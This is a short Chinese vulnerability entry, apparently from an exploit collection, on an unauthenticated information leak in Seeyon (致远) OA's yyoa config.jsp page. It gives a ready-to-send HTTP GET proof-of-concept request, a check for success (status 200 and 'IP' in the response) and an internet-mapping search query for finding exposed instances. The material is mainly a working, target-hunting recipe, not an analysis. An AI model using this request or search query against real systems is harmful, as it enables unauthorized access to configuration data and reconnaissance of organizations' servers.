---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 致远OA yyoa config.jsp 配置信息泄露漏洞

## 漏洞描述

致远OA 的 `/yyoa/ext/trafaxserver/SystemManage/config.jsp` 配置管理页面未授权即可访问，泄露系统配置信息（响应中包含 IP 等配置项）。

## 漏洞复现

```
GET /yyoa/ext/trafaxserver/SystemManage/config.jsp HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
```

响应状态码为 200，且响应体中包含 `IP` 即存在漏洞，可直接访问该 URL 查看配置信息。

## 网络测绘

```
app="致远互联-OA"
```

## 参考链接

- 利用细节依据 R4gd0ll/I-Wanna-Get-All 历史提交 `d8b866a` 中 `seeyon_yyoa_configJsp_info` 的 PoC 逻辑。
